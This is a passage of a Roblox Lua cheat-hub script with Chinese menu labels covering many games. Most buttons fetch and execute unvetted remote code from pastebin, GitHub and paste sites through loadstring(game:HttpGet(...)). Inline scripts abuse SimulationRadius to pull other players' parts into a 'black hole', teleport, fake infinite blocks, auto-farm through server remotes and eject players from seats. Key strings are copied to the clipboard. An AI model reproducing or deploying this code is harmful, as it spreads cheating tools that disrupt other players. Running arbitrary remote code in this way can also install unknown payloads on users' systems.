    button.MouseButton1Click:Connect(function()
        toggleBlackHole()
        if blackHoleActive then
            button.Text = "Desativar Buraco Negro"
        else
            button.Text = "Ativar Buraco Negro"
        end
    end)
end
 
createControlButton()
toggleBlackHole()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第4种)",
  Callback = function()
loadstring(game:HttpGet("https://pastefy.app/pYhER1z4/raw"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第5种)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/BLACKHOLDSCRIPT/refs/heads/main/BLACK%20HOLD%20SCRIPT"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第6种)",
  Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/qPcm2zPy"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(第7种)",
  Callback = function()
  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local angle = 1
local radius = 10
local blackHoleActive = false

local function setupPlayer()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    return humanoidRootPart, Attachment1
end

local humanoidRootPart, Attachment1 = setupPlayer()

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(part)
        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, part in pairs(Network.BaseParts) do
                if part:IsDescendantOf(Workspace) then
                    part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 500
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                angle = angle + math.rad(2)

                local offsetX = math.cos(angle) * radius
                local offsetZ = math.sin(angle) * radius

                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
            end
        end)
    else
        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    humanoidRootPart, Attachment1 = setupPlayer()
    if blackHoleActive then
        toggleBlackHole()
    end
end)

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
local window = library:Window("Projeto LKB")

window:Slider("Radius Blackhole",1,100,10, function(Value)
   radius = Value
end)

window:Toggle("Blackhole", true, function(Value)
       if Value then
            toggleBlackHole()
        else
            blackHoleActive = false
        end
end)

spawn(function()
    while true do
        RunService.RenderStepped:Wait()
        if blackHoleActive then
            angle = angle + math.rad(angleSpeed)
        end
    end
end)

toggleBlackHole()
  end
})

local Section = Tab:AddSection({
	Name = "环绕类"
})

Tab:AddButton({
  Name = "黑洞脚本(环绕v1)汉化",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao-xin-create/Super-Ring-Parts-V1/refs/heads/main/Super%20Ring%20Parts%20V1.lua"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(环绕v2)",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BOOSBS/666/refs/heads/main/656"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(环绕v3)汉化",
  Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao-xin-create/Super-Ring-Parts/refs/heads/main/Super%20Ring%20Parts%20v3.lua"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(环绕v4)",
  Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Super-Rings-Parts-V4-By-Lukas-24409"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(环绕v5)",
  Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-ring-Parts-V5-By-lukas-24432"))()
  end
})

Tab:AddButton({
  Name = "黑洞脚本(环绕)1",
  Callback = function()

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local angle = 1
local radius = 10
local blackHoleActive = false

local function setupPlayer()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    return humanoidRootPart, Attachment1
end

local humanoidRootPart, Attachment1 = setupPlayer()

if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }

    Network.RetainPart = function(part)
        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            part.CanCollide = false
        end
    end

    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
            for _, part in pairs(Network.BaseParts) do
                if part:IsDescendantOf(Workspace) then
                    part.Velocity = Network.Velocity
                end
            end
        end)
    end

    EnablePartControl()
end

local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then
            v:FindFirstChild("Attachment"):Destroy()
        end
        if v:FindFirstChild("AlignPosition") then
            v:FindFirstChild("AlignPosition"):Destroy()
        end
        if v:FindFirstChild("Torque") then
            v:FindFirstChild("Torque"):Destroy()
        end
        v.CanCollide = false
        
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 500
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = Attachment1
    end
end

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
    if blackHoleActive then
        for _, v in next, Workspace:GetDescendants() do
            ForcePart(v)
        end

        Workspace.DescendantAdded:Connect(function(v)
            if blackHoleActive then
                ForcePart(v)
            end
        end)

        spawn(function()
            while blackHoleActive and RunService.RenderStepped:Wait() do
                angle = angle + math.rad(2)

                local offsetX = math.cos(angle) * radius
                local offsetZ = math.sin(angle) * radius

                Attachment1.WorldCFrame = humanoidRootPart.CFrame * CFrame.new(offsetX, 0, offsetZ)
            end
        end)
    else
        Attachment1.WorldCFrame = CFrame.new(0, -1000, 0)
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    humanoidRootPart, Attachment1 = setupPlayer()
    if blackHoleActive then
        toggleBlackHole()
    end
end)

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
local window = library:Window("Projeto LKB")

window:Slider("Radius Blackhole",1,100,10, function(Value)
   radius = Value
end)

window:Toggle("Blackhole", true, function(Value)
       if Value then
            toggleBlackHole()
        else
            blackHoleActive = false
        end
end)

spawn(function()
    while true do
        RunService.RenderStepped:Wait()
        if blackHoleActive then
            angle = angle + math.rad(angleSpeed)
        end
    end
end)

toggleBlackHole()
  
end
})

local Tab = Window:MakeTab({
    Name = "自然灾害(不是黑洞)",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main'))()--Made By 1kWoof#0143
  end
})

Tab:AddButton({
  Name = "3（汉化）",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao122231/xiao122231/main/%E8%87%AA%E7%84%B6%E7%81%BE%E5%AE%B3"))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/73GG/Game-Scripts/main/Natural%20Disaster%20Survival.lua"))()
  end
})

local Section = Tab:AddSection({
	Name = "传送"
})

Tab:AddButton({
	Name = "出生点",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-245.7035369873047, 194.67227172851562, 298.7024230957031)
	end
})

Tab:AddButton({
	Name = "岛上",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-121.85655212402344, 47.903968811035156, 19.4310302734375)
	end
})

local Tab = Window:MakeTab({
    Name = "最强战场",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(Game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/tsbscripts/main/Main"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/SaitamaBattlegrounds.lua"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
  end
})

Tab:AddButton({
  Name = "4卡密:YieldingLeaks_3FuV7ie9k2rTJs4",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Tariviste/Gojo/main/Source"))()
  end
})

Tab:AddButton({
	Name = "复制上面的卡密",
	Callback = function()
setclipboard("YieldingLeaks_3FuV7ie9k2rTJs4")
end
})

Tab:AddButton({
  Name = "5",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/AyoReaper/Reaper-Hub/main/loader.lua"))()
  end
})

Tab:AddButton({
  Name = "6卡密:RoscriptsOnTop",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/RealOfficialSkully/Smm/main/Smm"))()
  end
})

Tab:AddButton({
	Name = "复制上面的卡密",
	Callback = function()
setclipboard("RoscriptsOnTop")
end
})

Tab:AddButton({
  Name = "7",
  Callback = function()
  loadstring(game:HttpGet("https://rawscripts.net/raw/The-Strongest-Battlegrounds-Phantasm-SUPPORTS-SOLARA-18046"))()
  end
})

Tab:AddButton({
  Name = "8",
  Callback = function()
  loadstring(game:HttpGet("https://pastefy.app/REPoaFWC/raw",true))();
  end
})

Tab:AddButton({
  Name = "9",
  Callback = function()
  loadstring(game:HttpGet('https://freenote.biz/raw/xkcdkgyhkx',true))()
  end
})

local Tab = Window:MakeTab({
    Name = "蜂群",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/3A61hnGA", true))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/infinitylua/Luascripts/main/KJFsdEj8sXrja.lua"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:GetObjects("rbxassetid://4384103988")[0X1].Source)("Pepsi Swarm")
  end
})

Tab:AddButton({
  Name = "Bee Swarm",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREE"))()
  end
})

Tab:AddButton({
  Name = "自动收集",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/uYzM0Vsr",true))()
  end
})

local Tab = Window:MakeTab({
    Name = "火箭模拟器",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
  Name = "1",
  Callback = function()
  loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/9245/%E7%8C%AB%E9%80%9A%E7%94%A8.txt?sign=hrWROZdVfK2mtJcIFa3Tvbl-TojP1C86_Zd3q03qttc%3D%3A0"))()
  end
})

Tab:AddButton({
  Name = "2",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/odhdshhe/jm-/refs/heads/main/jm%E7%81%AB%E7%AE%AD%E5%8F%91%E5%B0%84%E9%87%8D%E5%81%9A(1).lua"))()
  end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/321_blast_off_simulator')))()
  end
})

Tab:AddButton({
  Name = "禁漫中心1",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/refs/heads/main/jmjmjmjmjmjm114514.txt"))()
  end
})

local Section = Tab:AddSection({
	Name = "其他"
})

Tab:AddButton({
  Name = "自动收集燃料",
  Callback = function()
  isFuelScoopEnabled = ARL while true do wait() if isFuelScoopEnabled then for i, h in pairs(game.Players.LocalPlayer.Character:GetChildren()) do if h:IsA("Tool") and h.Name == "FuelScoop" then h:Activate() end end end end
  end
})

Tab:AddButton({
  Name = "登上火箭",
  Callback = function()
  game:GetService("ReplicatedStorage"):WaitForChild("BoardRocket"):FireServer()
  end
})

Tab:AddButton({
  Name = "将玩家从所有者座位移除",
  Callback = function()
  game:GetService("ReplicatedStorage"):WaitForChild("RemovePlayer"):FireServer()
  end
})

local Section = Tab:AddSection({
	Name = "传送类"
})

Tab:AddButton({
	Name = "发射台岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-123.15931701660156, 2.7371432781219482, 3.491959810256958)
	end
})

Tab:AddButton({
	Name = "白云岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-76.13252258300781, 170.55825805664062, -60.4516716003418)
	end
})

Tab:AddButton({
	Name = "浮漂岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-66.51714324951172, 720.4866333007812, -5.391753196716309)
	end
})

Tab:AddButton({
	Name = "卫星岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-34.2462043762207, 1429.4990234375, 1.3739361763000488)
	end
})

Tab:AddButton({
	Name = "蜜蜂迷宫岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6.5361199378967285, 3131.249267578125, -29.759048461914062)
	end
})

Tab:AddButton({
	Name = "月球人救援",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7.212917804718018, 5016.341796875, -19.815933227539062)
	end
})

Tab:AddButton({
	Name = "暗物质岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(68.43186950683594, 6851.94091796875, 7.890637397766113)
	end
})

Tab:AddButton({
	Name = "太空岩石岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(49.92888641357422, 8942.955078125, 8.674375534057617)
	end
})

Tab:AddButton({
	Name = "零号火星岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(54.44503402709961, 11270.0927734375, -1.273137092590332)
	end
})

Tab:AddButton({
	Name = "太空水晶小行星岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.579089164733887, 15295.6318359375, -27.54974365234375)
	end
})

Tab:AddButton({
	Name = "月球浆果岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-14.601255416870117, 18410.9609375, 0.9418511986732483)
	end
})

Tab:AddButton({
	Name = "铺路石岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3.272758960723877, 22539.494140625, 63.283935546875)
	end
})

Tab:AddButton({
	Name = "流星岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-45.515689849853516, 27961.560546875, -7.358333110809326)
	end
})

Tab:AddButton({
	Name = "升级岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2.7595248222351074, 33959.98828125, 53.93095397949219)
	end
})

local Tab = Window:MakeTab({
  Name = "造船寻宝",
  Icon = "rbxassetid://7734068321",
  PremiumOnly = false
  })
  
Tab:AddButton({
	Name = "脚本1",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
   end
})

Tab:AddButton({
  Name = "复制别人的船",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/autobuild.txt"))()---https://discord.gg/HjNaYs6AnV discord
  end
})

Tab:AddButton({
	Name = "无限方块",
	Callback = function()
       spawn(function()
local guiinf = game:GetService("Players").LocalPlayer.PlayerGui.BuildGui.InventoryFrame.ScrollingFrame.BlocksFrame
_G.Blocks = false
while game:GetService("RunService").RenderStepped:wait() do
   if _G.Blocks then return end
       for i,v in pairs(guiinf:GetDescendants()) do
               if v.Name == "AmountText" then
               v.Text = math.huge
           end
       end
   end
end)
  	end
})

Tab:AddButton({
	Name = "刷钱",
	Callback = function()
      loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
  	end
})

local Tab = Window:MakeTab({
    Name = "彩虹朋友",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false
})

Tab:AddButton({
    Name="1",
    Callback=function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Sempiller/RainbowTool/main/Turkish.lua'))();
    end
})

Tab:AddButton({
	Name = "2",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/JNHHGaming/Rainbow-Friends/main/Rainbow%20Friends"))()
  	end    
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0rainbow'))()
  end
})

Tab:AddButton({
  Name = "彩虹朋友脚本(可以找到所有物品)",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/BorkWare/main/Scripts/' .. game.GameId .. ".lua"))(' Watermelon ? ')
  end
})
local Tab = Window:MakeTab({
	Name = "忍者传奇",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
Tab:AddButton ({
	Name = "1",
	Callback = function ()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/zerpqe/script/main/NinjaLegends.lua"))()
	end
})
Tab:AddButton ({
	Name = "2",
	Callback = function ()
	 loadstring(game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/5repo/main/script4.lua"))()
	end
})

Tab:AddButton({
  Name = "3",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/Legend%20of%20Shenqing%20Ninja.lua"))()
  end
})

Tab:AddButton({
  Name = "4",
  Callback = function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/Zyb150933/zyb/main/123'))()
  end
})

Tab:AddButton({
  Name = "5",
  Callback = function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatBlueDevil/Bleus/main/Ninja%20Legends/Source.lua"))()
  end
})

Tab:AddButton({
  Name = "*自动收集宝石或气",
  Callback = function()
  local Maker = "Ttm"
loadstring(game:HttpGet("https://raw.githubusercontent.com/TtmScripter/-/main/AutoGetIDK(NinjaLegend)"))()
while wait() do
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = Get
end
  end
})

local Section = Tab:AddSection({
	Name = "传送岛屿"
})

Tab:AddButton({
	Name = "出生",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(25.665502548217773, 3.4228405952453613, 29.919952392578125)
	end
})

Tab:AddButton({
	Name = "魔法",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51.17238235473633, 766.1807861328125, -138.44842529296875)
	end
})

Tab:AddButton({
	Name = "星岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207.2932891845703, 2013.88037109375, 237.36672973632812)
	end
})

Tab:AddButton({
	Name = "密岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(171.97178649902344, 4047.380859375, 42.0699577331543)
	end
})

Tab:AddButton({
	Name = "天空岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.83824157714844, 5657.18505859375, 73.5014877319336)
	end
})

Tab:AddButton({
	Name = "冷岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(139.28330993652344, 9285.18359375, 77.36406707763672)
	end
})

Tab:AddButton({
	Name = "无限岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(149.34817504882812, 13680.037109375, 73.3861312866211)
	end
})

Tab:AddButton({
	Name = "沙岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(133.37144470214844, 17686.328125, 72.00334167480469)
	end
})

Tab:AddButton({
	Name = "雷岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(143.19349670410156, 24070.021484375, 78.05432891845703)
	end
})

Tab:AddButton({
	Name = "远古炼狱岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.27163696289062, 28256.294921875, 69.3790283203125)
	end
})

Tab:AddButton({
	Name = "暗影岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(132.74267578125, 33206.98046875, 57.495574951171875)
	end
})

Tab:AddButton({
	Name = "灵魂岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.76148986816406, 39317.5703125, 61.06639862060547)
	end
})

Tab:AddButton({
	Name = "奇迹岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.2720184326172, 46010.5546875, 55.941951751708984)
	end
})

Tab:AddButton({
	Name = "黄金岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(128.32339477539062, 52607.765625, 56.69411849975586)
	end
})

Tab:AddButton({
	Name = "传奇岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(146.35226440429688, 59594.6796875, 77.53300476074219)
	end
})

Tab:AddButton({
	Name = "科技传奇岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.3321075439453, 66669.1640625, 72.21722412109375)
	end
})

Tab:AddButton({
	Name = "超能岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.48077392578125, 70271.15625, 57.02311325073242)
	end
})

Tab:AddButton({
	Name = "混沌传奇岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.58590698242188, 74442.8515625, 69.3177719116211)
	end
})

Tab:AddButton({
	Name = "黑暗岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(136.9700927734375, 79746.984375, 58.54051971435547)
	end
})

Tab:AddButton({
	Name = "黑暗元素岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.697265625, 83198.984375, 72.73107147216797)
	end
})

Tab:AddButton({
	Name = "和平岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.3157501220703, 87051.0625, 66.78429412841797)
	end
})

Tab:AddButton({
	Name = "漩涡岛",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.08216857910156, 91246.0703125, 69.56692504882812)
	end
})

Tab:AddButton({
	Name = "35倍金币",
	Callback = function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.2938232421875, 91245.765625, 120.54232788085938)
	end
})
autoswing = false
function swinging()
    spawn(
        function()
            while autoswing == true do
                task.wait()
                game:GetService("Players").LocalPlayer.ninjaEvent:FireServer("swingKatana")
                if not autoswing then
                    break
                end
            end
        end
    )
end
autosell = false
function selling()
    spawn(
        function()
            while autosell == true do
                task.wait(.01)
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    game.workspace.sellAreaCircles["sellAreaCircle7"].circleInner.CFrame =
                        game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                    wait(.1)
                    game.workspace.sellAreaCircles["sellAreaCircle7"].circleInner.CFrame =
                        game.Workspace.Part.CFrame
                    if not autosell then
                        break
                    end
                end
            end
        end
    )
end
autosellmax = false
function maxsell()
    spawn(
        function()
            while autosellmax == true do
                task.wait()
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    if game.Players.LocalPlayer.PlayerGui.gameGui.maxNinjitsuMenu.Visible == true then
                        game.workspace.sellAreaCircles["sellAreaCircle7"].circleInner.CFrame =
                            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
                        task.wait()
                        game.workspace.sellAreaCircles["sellAreaCircle7"].circleInner.CFrame =
                            game.Workspace.Part.CFrame
                    end
                end
                if not autosellmax then
                    break
                end
            end
        end
    )
end
autobuyswords = false
function buyswords()
    spawn(
        function()
            while autobuyswords == true do
                task.wait()
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    local oh1 = "buyAllSwords"
                    local oh2 = {
                        "Ground",
                        "Astral Island",
                        "Space Island",
                        "Tundra Island",
                        "Eternal Island",
                        "Sandstorm",
                        "Thunderstorm",
                        "Ancient Inferno Island",
                        "Midnight Shadow Island",
                        "Mythical Souls Island",
                        "Winter Wonder Island"
                    }
                    for i = 1, #oh2 do
                        game:GetService("Players").LocalPlayer.ninjaEvent:FireServer(oh1, oh2[i])
                    end
                end
                if not autobuyswords then
                    break
                end
            end
        end
    )
end
autobuybelts = false
function buybelts()
    spawn(
        function()
            while autobuybelts == true do
                task.wait()
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    local oh1 = "buyAllBelts"
                    local oh2 = {
                        "Ground",
                        "Astral Island",
                        "Space Island",
                        "Tundra Island",
                        "Eternal Island",
                        "Sandstorm",
                        "Thunderstorm",
                        "Ancient Inferno Island",
                        "Midnight Shadow Island",
                        "Mythical Souls Island",
                        "Winter Wonder Island"
                    }
                    for i = 1, #oh2 do
                        game:GetService("Players").LocalPlayer.ninjaEvent:FireServer(oh1, oh2[i])
                    end
                end
                if not autobuybelts then
                    break
                end
            end
        end
    )
end
autobuyranks = false
function buyranks()
    spawn(
        function()
            while autobuyranks == true do
                task.wait()
                if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") then
                    local oh1 = "buyRank"
                    local oh2 = game:GetService("ReplicatedStorage").Ranks.Ground:GetChildren()
                    for i = 1, #oh2 do
